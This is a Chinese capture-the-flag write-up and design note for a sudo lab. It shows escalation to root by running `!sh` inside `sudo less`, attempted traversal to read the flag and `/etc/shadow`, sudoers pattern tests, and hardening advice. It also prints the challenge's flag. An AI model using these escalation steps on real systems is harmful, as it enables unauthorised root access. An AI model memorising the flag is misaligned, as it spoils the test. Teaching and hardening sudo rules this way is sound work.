## 二、题目考点

1. **sudo 规则匹配的是“命令 + 参数”，不是“程序职责”**。规则写得再窄，授权的仍是 `less` 这个可执行文件，它在 root 身份下运行。
2. **分页器（pager）是可交互的命令执行器**。`less` 里输入 `!命令` 会 fork 一个 shell 执行该命令，且沿用 `less` 的 euid（这里是 root）。
3. **`sudo -l` 是提权第一步**：先枚举被授权的命令，再判断这些命令能否被“扭曲使用”（GTFOBins 思路）。
4. **干扰项识别**：`/etc/sudoers.d/` 下第二条规则授权对象是 `web` 用户（uid 997、nologin、密码锁定），`player` 用不上；直接 `sudo tar` 会被拒。
5. **参数约束的正确写法**：sudo 的参数匹配用 fnmatch，`*` 会连同 `/` 和空格一起吞掉，`/var/log/app/*` 可被 `../` 穿越、也能塞第二个参数。本题改用参数级正则 `^/var/log/app/[A-Za-z0-9._-]+$`，只允许 `/var/log/app/` 下**一个**文件名，不含 `/`、不接受额外参数。

## 三、解题过程

### 3.1 第一步：确认当前身份与权限边界

```bash
id
# uid=1001(player) gid=1001(player) groups=1001(player)

cat /var/log/app/app.log
# cat: /var/log/app/app.log: Permission denied
```

目录是 `750 root:root`，普通用户连读日志的资格都没有——正常的“看日志”路径不通，必须借 sudo。

### 3.2 第二步：枚举 sudo 授权

```bash
sudo -l
```

```text
Matching Defaults entries for player on 7351632e39eb:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User player may run the following commands on 7351632e39eb:
    (root) NOPASSWD: /usr/bin/less ^/var/log/app/[A-Za-z0-9._-]+$
```

只有一条：可以免密以 root 运行 `less`，参数被锚定正则锁死。`NOPASSWD` 意味着连密码都不用。

再看配置目录，确认没有遗漏（同时发现干扰项）：

```bash
ls -l /etc/sudoers.d/
# -r--r----- 1 root root   63 90-readlogs
# -r--r----- 1 root root   64 91-archive
# -r--r----- 1 root root 1068 README
```

`91-archive` 授权的是 `web` 用户，不是 `player`：

```bash
id web
# uid=997(web) gid=996(web) groups=996(web)   （nologin、密码锁定，无法登录）
sudo /usr/bin/tar -czf /tmp/x /var/log/app/
# Sorry, user player is not allowed to execute '/usr/bin/tar -czf /tmp/x /var/log/app/' as root
```

同理，直接要一个 shell 也不行：

```bash
sudo /bin/bash
# Sorry, user player is not allowed to execute '/bin/bash' as root
```

尝试绕过参数限制（全部被拒，见 4.2）：

```bash
sudo less /var/log/app/../../../flag.txt
sudo less -X /var/log/app/app.log
sudo less /var/log/app/app.log /etc/shadow
# 三条都返回 Sorry, user player is not allowed to execute …
```

到这一步，唯一入口只剩“按规定参数运行 less”。

### 3.3 第三步：在 less 里拿 root shell

`less` 是交互式分页器，运行期间支持 `!` 前缀执行外部命令。由于它由 sudo 启动，子 shell 继承 euid=0。

```bash
sudo less /var/log/app/app.log
```

进入分页界面后（日志显示 `[2024-03-11 09:05:40] WARN slow query 1.2s`），输入：

```text
!sh
```

得到 root shell：

```text
# id
uid=0(root) gid=0(root) groups=0(root)
# cat /flag.txt
Ly_Flag{cv1vmsdr}
```

拿 flag 完成。退出 shell 会回到 less（提示 `!done (press RETURN)`），按回车后 `q` 退出。

## 四、验证记录（VM 实测）

VM：`192.168.204.178`，Ubuntu 24.04.5，Docker 28.5.1；容器 `lx02`（端口 `22002`）。

### 4.1 正向 / 负向用例

| # | 命令（player 身份） | 期望 | 实测结果 | 判定 |
| --- | --- | --- | --- | --- |
| 1 | `id` | uid=1001 | `uid=1001(player) gid=1001(player)` | ✅ |
| 2 | `cat /var/log/app/app.log` | 拒绝 | `Permission denied` | ✅ |
| 3 | `sudo -l` | 仅一条 less 规则 | 仅 `(root) NOPASSWD: /usr/bin/less ^/var/log/app/[A-Za-z0-9._-]+$` | ✅ |
| 4 | `sudo /usr/bin/tar -czf /tmp/x /var/log/app/` | 拒绝 | `Sorry, user player is not allowed to execute …` | ✅ |
| 5 | `sudo /bin/bash` | 拒绝 | `Sorry, user player is not allowed to execute '/bin/bash'` | ✅ |
| 6 | `sudo less /var/log/app/../../../flag.txt` | 拒绝 | `Sorry, user player is not allowed to execute …` | ✅ 已堵住 |
| 7 | `sudo less -X /var/log/app/app.log` | 拒绝 | `Sorry, user player is not allowed to execute …` | ✅ 已堵住 |
| 8 | `sudo less /var/log/app/app.log /etc/shadow` | 拒绝 | `Sorry, user player is not allowed to execute …` | ✅ 已堵住 |
| 9 | `sudo less /var/log/app/app.log` → `!sh` → `cat /flag.txt` | 拿 flag | `uid=0(root)`，读到 `Ly_Flag{cv1vmsdr}` | ✅ 唯一解 |

结论：本题设计意图（less → `!sh` → root）可稳定复现；参数级正则把三类旁路（路径穿越、加选项、塞第二参数）全部封死，`less` 的交互能力成为唯一解。

### 4.2 sudoers 参数约束的选型实测

在临时容器里逐条试过三种写法（用 `sudo -n` 判定 allow/deny）：

| 写法 | `app.log` | `app.log.1` | `../../../flag.txt` | `-X app.log` | `app.log /etc/shadow` |
| --- | --- | --- | --- | --- | --- |
| `/usr/bin/less /var/log/app/*` | 允许 | 允许 | **允许（读到 flag）** | 拒绝 | **允许（连带读 shadow）** |
| `/usr/bin/less /var/log/app/[A-Za-z0-9._-]*` | 允许 | 允许 | **允许（读到 flag）** | 拒绝 | **允许（连带读 shadow）** |
| `/usr/bin/less ^/var/log/app/[A-Za-z0-9._-]+$` | 允许 | 允许 | 拒绝 | 拒绝 | 拒绝 |

要点：

- sudo 的参数匹配是 fnmatch，`*` 不区分 `/`，也不区分空格，所以任何以 `*` 结尾的写法都能被 `..` 穿越、也能吞掉第二个参数。仅把 `*` 换成 `[A-Za-z0-9._-]*` 无效（实测仍能读到 flag）。
- 参数位写成 `^…$` 的正则时，sudo 按正则匹配整个参数，`[A-Za-z0-9._-]+` 不含 `/`、`$` 锚定结尾，天然挡掉穿越和额外参数。注意：**`^` / `$` 必须成对**，只写 `^/usr/bin/less` 会被 `visudo` 判为 `expected a fully-qualified path name`。
- 正则里不要把 `.` 放开太多：`..` 本身能被匹配（`sudo less /var/log/app/..` 会放行），但那只是一个目录，读不到任何内容，不影响唯一解。

### 4.3 flag 每题固定（flag.txt）
flag 是**每题一个固定值**：题目目录下的 `flag.txt` 由 Dockerfile `COPY` 到 `/flag.txt`，
再 `chown root:root && chmod 400`。十道题十份文件、内容互不相同；同一题多次构建、多个实例
取值都一致，评分不需要再按实例取 flag。

```bash
docker exec lx02 stat -c '%a %U:%G' /flag.txt   # 400 root:root
docker exec lx02 cat /flag.txt                    # Ly_Flag{cv1vmsdr}
```

注意：flag 在构建时就写进镜像层，`docker save` 出来的 tar 同样带着它；若镜像/tar 会发给选手，
等于直接送出 flag，这种情况下应改为运行时挂载或环境变量注入。

## 六、修复建议与剩余风险

### 6.1 参数约束（已按本方案修复）

```sudoers
player ALL=(root) NOPASSWD: /usr/bin/less ^/var/log/app/[A-Za-z0-9._-]+$
```

维护时注意三点：

1. `^` 与 `$` 必须成对，否则 `visudo -c` 报 `expected a fully-qualified path name`。
2. 字符类里不要包含 `/`，不要把 `*` 用在参数位（fnmatch 的 `*` 跨目录、跨空格）。
3. 改完必须 `visudo -c -f /etc/sudoers.d/90-readlogs` 校验。

### 6.2 不要给交互式程序 sudo（本题的教学点）

`less / more / man / vim / nano / tar / awk / find / env / python` 都属 GTFOBins 家族，“只读看文件”的授权会被一句话变成 root shell。本题刻意保留 `less` 作为唯一解法；若要在生产环境消除该类风险，应改为受控封装（root 所有、`open` 前 `realpath` 校验前缀）而不是直接授权 pager。

### 6.3 干扰项仍可加固

`91-archive` 里 `tar -czf /tmp/* /var/log/app/` 同样是危险授权（tar 有 `--checkpoint-action=exec`）。本题 `web` 不可登录，风险为 0；但演示用规则建议写成无害形式，避免被误抄进真实环境。

### 6.4 构建侧遗留项

- `FROM ubuntu:24.04` 未固定 digest，建议改成 `ubuntu:24.04@sha256:…`。
- 十题镜像目前都在 VM 上以 `latest` 标签迭代，交付时应改成带题号+日期的固定标签，避免 `latest` 漂移。
- 十题已统一为固定 flag：各题目录一份 `flag.txt`，镜像与 tar 均按固定值重建。

## 七、教学要点

1. `sudo -l` 之后不要只看“允许了哪些命令”，要看“这些命令能做什么”。
2. 交互式程序（编辑器、分页器、shell 包装器）在被 sudo 授权时，等价于授权了任意命令执行。
3. sudoers 参数约束的关键是“参数能不能被锚定成穷举集合”：`*` 会被 `..` 与空格绕过，参数级正则 `^…$` 才可靠。
4. 干扰项（`91-archive` / `web` 用户）训练的是“先确认授权对象是不是自己”。
